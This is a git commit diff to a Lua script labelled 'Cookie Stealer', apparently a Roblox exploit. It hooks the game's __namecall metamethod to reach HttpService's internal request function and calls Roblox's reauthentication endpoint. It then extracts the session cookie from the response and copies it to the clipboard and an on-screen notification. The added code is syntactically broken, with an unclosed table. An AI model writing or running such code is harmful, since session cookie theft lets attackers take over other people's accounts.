a3af4899da777727518bee224a63b2bedb509c2e
CatScripter <137832645+CatScripter@users.noreply.github.com>
2023-12-07 19:51:13 +0300

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,11 +1,27 @@
 --Cookie Stealer
-local httpService = cloneref(game:GetService("HttpService"));
-local requestInternal = clonefunction(httpService.requestInternal);
+local HttpService
+local RequestInternal
+local Old 
+Old = hookmetamethod(game, "__namecall", function(...)
+    if not MessageBus then
+        HttpService = game.GetService(game, "HttpService")
+        RequestInternal = HttpService.RequestInternal
+    end 
+    return Old(...)
+end)
 
-requestInternal(httpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
+task.wait(1)
+
+RequestInternal(HttpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
     if b then 
         Cookie = b.Headers["set-cookie"]:split(";")[1]
-        warn("Cookie Grabbed:", Cookie)
+        setclipboard("Cookie Grabbed:", Cookie)
+            wait(0.1)
+        game.StarterGui:SetCore("SendNotification", {
+        Title = "Test Cookie";
+        Text = Cookie;
+        Icon = "rbxassetid://13165941837";
+        Duration = 5;
     end
 end)
 
